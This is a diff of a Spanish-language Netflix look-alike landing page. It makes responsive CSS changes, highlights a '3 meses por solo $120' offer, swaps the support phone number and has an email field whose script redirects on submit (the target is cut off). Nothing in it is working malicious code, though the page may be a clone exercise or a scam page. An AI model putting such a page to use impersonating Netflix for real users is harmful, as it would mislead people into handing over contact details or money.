@@ -63,13 +63,14 @@
             align-items: center;
             text-align: center;
             margin-top: 10rem;
+            padding: 0 20px;
         }
 
-        .showcase-content h1 { font-size: 3.5rem; font-weight: 900; line-height: 1.1; margin-bottom: 1.5rem; }
+        .showcase-content h1 { font-size: 3.5rem; font-weight: 900; line-height: 1.1; margin-bottom: 1rem; }
         .showcase-content p { font-size: 1.6rem; margin-bottom: 2rem; }
 
         /* Formulario de Email */
-        .email-form h3 { font-size: 1.2rem; font-weight: 400; margin-bottom: 20px; }
+        .email-form h3 { font-size: 1.2rem; font-weight: 400; margin-bottom: 20px; padding: 0 10px; }
         .input-group { display: flex; justify-content: center; width: 100%; }
         
         .input-group input {
@@ -80,6 +81,7 @@
             border-radius: 2px 0 0 2px;
             background: rgba(0, 0, 0, 0.6);
             color: #fff;
+            outline: none;
         }
 
         .btn-xl {
@@ -101,6 +103,7 @@
         .tabs { background: var(--dark-color); padding-top: 1rem; border-bottom: 3px solid #3d3d3d; }
         .tabs .container { display: grid; grid-template-columns: repeat(3, 1fr); max-width: 950px; margin: auto; }
         .tab-item { padding: 1.5rem 0; color: #999; cursor: pointer; text-align: center; }
+        .tab-item i { margin-bottom: 10px; }
         .tab-item:hover { color: #fff; }
         .tab-border { border-bottom: var(--primary-color) 4px solid; color: #fff; }
 
@@ -118,7 +121,7 @@
         .tab-2-content-bottom img { width: 100%; margin-bottom: 0.5rem; }
 
         /* Tabla de Precios */
-        .table { width: 100%; margin-top: 2rem; border-collapse: collapse; color: #999; }
+        .table { width: 100%; margin-top: 2rem; border-collapse: collapse; color: #999; font-size: 0.9rem; }
         .table thead th { padding: 0.8rem; text-transform: uppercase; color: #fff; }
         .table tbody tr td { padding: 0.8rem; text-align: center; border-bottom: 1px solid #3d3d3d; }
         .table tbody tr td:first-child { text-align: left; }
@@ -130,13 +133,28 @@
         .footer ul { list-style: none; }
         .footer a { color: #999; font-size: 0.9rem; text-decoration: none; line-height: 2.2; }
 
-        @media (max-width: 700px) {
-            .showcase-content h1 { font-size: 2.5rem; }
+        /* --- ACTUALIZACIÓN VERSIÓN MÓVIL --- */
+        @media (max-width: 768px) {
+            .showcase-top { padding: 0 20px; height: 70px; }
+            .showcase-top img { width: 120px; }
+            
+            .showcase-content { margin-top: 7rem; }
+            .showcase-content h1 { font-size: 2.2rem; }
+            .showcase-content p { font-size: 1.2rem; }
+
             .input-group { flex-direction: column; align-items: center; }
-            .input-group input { width: 100%; border-radius: 2px; }
-            .btn-xl { border-radius: 2px; margin-top: 10px; width: 100%; justify-content: center; }
-            .tab-1-content-inner, .tab-2-content-top, .tab-2-content-bottom { grid-template-columns: 1fr; }
+            .input-group input { width: 100%; border-radius: 2px; margin-bottom: 15px; }
+            .btn-xl { border-radius: 2px; width: 100%; justify-content: center; font-size: 1.3rem; }
+
+            .tab-item i { font-size: 2rem; }
+            .tab-1-content-inner { grid-template-columns: 1fr; text-align: center; }
+            .tab-2-content-top { grid-template-columns: 1fr; text-align: center; }
+            .tab-2-content-bottom { grid-template-columns: 1fr; }
+            
+            .table thead { display: none; } /* Ocultar cabecera en móvil para mejor lectura */
             .footer-cols { grid-template-columns: repeat(2, 1fr); }
+            
+            .hide-sm { display: none; } /* Para ocultar textos largos en pestañas si fuera necesario */
         }
     </style>
 </head>
@@ -145,11 +163,11 @@
     <header class="showcase">
         <div class="showcase-top">
             <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" />
-            <a href="#" class="btn-xl" style="padding: 7px 17px; font-size: 1rem; border-radius:3px;">Iniciar sesión</a>
+            <a href="#" class="btn-xl" style="padding: 7px 17px; font-size: 0.9rem; border-radius:3px; font-weight: bold;">Iniciar sesión</a>
         </div>
         <div class="showcase-content">
             <h1>Películas y series ilimitadas y mucho más</h1>
-            <h1> 3 meses por solo $120</h1>
+            <h1 style="color: #e50914;">3 meses por solo $120</h1>
             <p>Disfruta donde quieras. Cancela cuando quieras.</p>
             <div class="email-form">
                 <h3>¿Quieres ver algo ya? Escribe tu correo para crear una suscripción o reiniciar tu membresía.</h3>
@@ -165,9 +183,9 @@
 
     <section class="tabs">
         <div class="container">
-            <div id="tab-1" class="tab-item tab-border"><i class="fas fa-door-open fa-3x"></i><p>Cancela cuando quieras</p></div>
-            <div id="tab-2" class="tab-item"><i class="fas fa-tablet-alt fa-3x"></i><p>Ve donde quieras</p></div>
-            <div id="tab-3" class="tab-item"><i class="fas fa-tags fa-3x"></i><p>Elige tu precio</p></div>
+            <div id="tab-1" class="tab-item tab-border"><i class="fas fa-door-open fa-2x"></i><p>Cancela</p></div>
+            <div id="tab-2" class="tab-item"><i class="fas fa-tablet-alt fa-2x"></i><p>Dispositivos</p></div>
+            <div id="tab-3" class="tab-item"><i class="fas fa-tags fa-2x"></i><p>Precios</p></div>
         </div>
     </section>
 
@@ -177,16 +195,16 @@
                 <div class="tab-1-content-inner">
                     <div>
                         <p class="text-lg">Si decides que Netflix no es para ti, no hay problema. Sin compromisos. Cancela online cuando quieras.</p>
-                        <a href="#" class="btn-xl" style="display:inline-block; font-size: 1.2rem; border-radius:2px;">Pruébalo ahora</a>
+                        <a href="#" class="btn-xl" style="display:inline-block; font-size: 1.1rem; border-radius:2px;">Pruébalo ahora</a>
                     </div>
-                    <img src="img/logo.png" alt="" />
+                    <img src="img/logo.png" alt="" style="max-width: 200px; margin: 20px auto; display: block;" />
                 </div>
             </div>
 
             <div id="tab-2-content" class="tab-content-item">
                 <div class="tab-2-content-top">
-                    <p class="text-lg">Ve series y películas cuándo y dónde quieras, personalizadas para ti.</p>
-                    <a href="#" class="btn-xl" style="display:inline-block; font-size: 1.2rem; border-radius:2px;">Pruébalo ahora</a>
+                    <p class="text-lg">Ve series y películas cuándo y dónde quieras.</p>
+                    <a href="#" class="btn-xl" style="display:inline-block; font-size: 1.1rem; border-radius:2px;">Pruébalo ahora</a>
                 </div>
                 <div class="tab-2-content-bottom">
                     <div><img src="img/tab-content-2-1.png" alt="" /><p>Ve en tu TV</p></div>
@@ -201,9 +219,9 @@
                         <tr><th></th><th>Básico</th><th>Estándar</th><th>Premium</th></tr>
                     </thead>
                     <tbody>
-                        <tr><td>precios mensuales</td><td>$99</td><td>$219</td><td>$299</td></tr>
-                        <tr><td>Estandar (sin anuncios)</td><td><i class="fas fa-times"></i></td><td><i class="fas fa-check"></i></td><td><i class="fas fa-check"></i></td></tr>
-                        <tr><td>Premiun ultra HD </td><td><i class="fas fa-times"></i></td><td><i class="fas fa-times"></i></td><td><i class="fas fa-check"></i></td></tr>
+                        <tr><td>Precios mensuales</td><td>$99</td><td>$219</td><td>$299</td></tr>
+                        <tr><td>Sin anuncios</td><td><i class="fas fa-times"></i></td><td><i class="fas fa-check"></i></td><td><i class="fas fa-check"></i></td></tr>
+                        <tr><td>Ultra HD</td><td><i class="fas fa-times"></i></td><td><i class="fas fa-times"></i></td><td><i class="fas fa-check"></i></td></tr>
                         <tr><td>Pantallas</td><td>2</td><td>2</td><td>4</td></tr>
                     </tbody>
                 </table>
@@ -212,17 +230,16 @@
     </section>
 
     <footer class="footer">
-        <p>¿Preguntas? Llama al 900 822 376</p>
+        <p>¿Preguntas? Llama al 800 953 1430</p>
         <div class="footer-cols">
             <ul><li><a href="#">FAQ</a></li><li><a href="#">Privacidad</a></li></ul>
-            <ul><li><a href="#">Centro de ayuda</a></li><li><a href="#">Cookies</a></li></ul>
-            <ul><li><a href="#">Cuenta</a></li><li><a href="#">Info corporativa</a></li></ul>
-            <ul><li><a href="#">Prensa</a></li><li><a href="#">Contáctanos</a></li></ul>
+            <ul><li><a href="#">Ayuda</a></li><li><a href="#">Cookies</a></li></ul>
+            <ul><li><a href="#">Cuenta</a></li><li><a href="#">Corporativo</a></li></ul>
+            <ul><li><a href="#">Prensa</a></li><li><a href="#">Contacto</a></li></ul>
         </div>
     </footer>
 
     <script>
-        // Pestañas
         const tabItems = document.querySelectorAll('.tab-item');
         const tabContentItems = document.querySelectorAll('.tab-content-item');
 
@@ -235,7 +252,6 @@
 
         tabItems.forEach(item => item.addEventListener('click', selectItem));
 
-        // Redirección
         function continuar() {
             const email = document.getElementById('email-input').value;
             if(email.includes('@')) {
